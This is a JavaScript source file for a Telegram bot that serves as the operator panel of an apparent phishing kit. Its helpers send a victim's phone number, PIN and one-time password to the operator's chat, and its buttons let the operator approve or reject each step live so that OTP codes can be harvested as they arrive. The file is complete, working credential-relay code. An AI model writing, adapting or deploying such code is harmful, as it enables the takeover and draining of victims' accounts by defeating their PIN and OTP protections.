const { Telegraf, Markup } = require('telegraf');
const db = require('./db');

console.log('[telegram.js] loading...');

const TOKEN = (process.env.BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.CHAT_ID || '').trim();

console.log('[telegram.js] TOKEN length:', TOKEN.length, '| CHAT_ID:', CHAT_ID || '(missing)');

if (!TOKEN) {
  console.error('❌ BOT_TOKEN is missing in .env');
  process.exit(1);
}
if (!/^\d+:[A-Za-z0-9_-]{30,}$/.test(TOKEN)) {
  console.error('❌ BOT_TOKEN format invalid:', JSON.stringify(TOKEN));
  process.exit(1);
}
if (!CHAT_ID) {
  console.error('❌ CHAT_ID is missing in .env');
  process.exit(1);
}

const bot = new Telegraf(TOKEN);
console.log('[telegram.js] Telegraf instance created');

/* Escape Markdown special chars */
function esc(s) {
  return String(s == null ? '' : s).replace(/([_*`\[\]])/g, '\\$1');
}

/* ---------- Send helpers ---------- */

async function sendLoginApproval(sessionId, phone, pin) {
  const text =
    `🔐 *LOGIN REQUEST*\n\n` +
    `📱 Phone: \`${esc(phone)}\`\n` +
    `🔑 PIN:   \`${esc(pin)}\`\n` +
    `🆔 Session: \`${sessionId}\`\n\n` +
    `Approve to ask for OTP, or Reject to cancel.`;

  await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      Markup.button.callback('✅ Approve', `A|${sessionId}`),
      Markup.button.callback('❌ Reject',  `R|${sessionId}`),
    ]),
  });
}

async function sendOtpApproval(sessionId, phone, otp) {
  const text =
    `🔢 *OTP RECEIVED*\n\n` +
    `📱 Phone: \`${esc(phone)}\`\n` +
    `🔢 OTP:   \`${esc(otp)}\`\n` +
    `🆔 Session: \`${sessionId}\`\n\n` +
    `Choose the result:`;

  await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('✅ OTP Correct', `O|${sessionId}`)],
      [Markup.button.callback('❌ Wrong OTP',   `W|${sessionId}`)],
      [Markup.button.callback('🔙 Wrong PIN',   `P|${sessionId}`)],
    ]),
  });
}

/* ---------- Callback handler ---------- */

bot.on('callback_query', async (ctx) => {
  try {
    const data = ctx.callbackQuery?.data || '';
    const [action, sessionId] = data.split('|');

    if (!sessionId || !['A', 'R', 'O', 'W', 'P'].includes(action)) {
      return await ctx.answerCbQuery('Invalid action');
    }

    const session = db.getSession(sessionId);
    if (!session) return await ctx.answerCbQuery('Session expired');

    const toast = { A: 'Approved ✅', R: 'Rejected ❌', O: 'Success ✅', W: 'Wrong OTP', P: 'Wrong PIN' }[action];
    await ctx.answerCbQuery(toast);

    let newStatus, newStage, doneLabel;
    if (action === 'A' && session.stage === 'login') {
      newStatus = 'APPROVED'; newStage = 'login'; doneLabel = '✅ Approved — awaiting OTP';
    } else if (action === 'R') {
      newStatus = 'REJECTED'; newStage = 'done'; doneLabel = '❌ Rejected';
    } else if (action === 'O') {
      newStatus = 'SUCCESS'; newStage = 'done'; doneLabel = '🎉 SUCCESS';
    } else if (action === 'W') {
      newStatus = 'WRONG_OTP'; newStage = 'otp'; doneLabel = '⚠️ Wrong OTP sent';
    } else if (action === 'P') {
      newStatus = 'WRONG_PIN'; newStage = 'done'; doneLabel = '⚠️ Wrong PIN sent';
    } else {
      return;
    }

    db.updateSession(sessionId, { status: newStatus, stage: newStage });

    await ctx.editMessageReplyMarkup({
      inline_keyboard: [[{ text: doneLabel, callback_data: 'done' }]],
    }).catch((err) => console.error('editMessageReplyMarkup failed:', err?.message || err));
  } catch (err) {
    console.error('callback_query error:', err);
    try { await ctx.answerCbQuery('Error'); } catch (_) {}
  }
});

/* ---------- Bot lifecycle ---------- */

function startBot() {
  console.log('[telegram.js] startBot() entered');
  console.log('[telegram.js] calling bot.launch()...');

  // IMPORTANT: bot.launch() returns a promise that NEVER resolves while polling.
  // Use the 2nd argument (onLaunch callback) to know when the bot is ready.
  bot.launch(
    { dropPendingUpdates: true },
    () => {
      console.log('🤖 Telegram bot started (long-polling, no webhook)');
    }
  ).catch((err) => {
    console.error('\n❌ [telegram.js] bot.launch() FAILED:');
    console.error('   error_code: ', err?.response?.error_code);
    console.error('   description:', err?.response?.description);
    console.error('   message:    ', err?.message);
    console.error('   stack:      ', err?.stack);
    process.exit(1);
  });

  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

module.exports = { bot, sendLoginApproval, sendOtpApproval, startBot };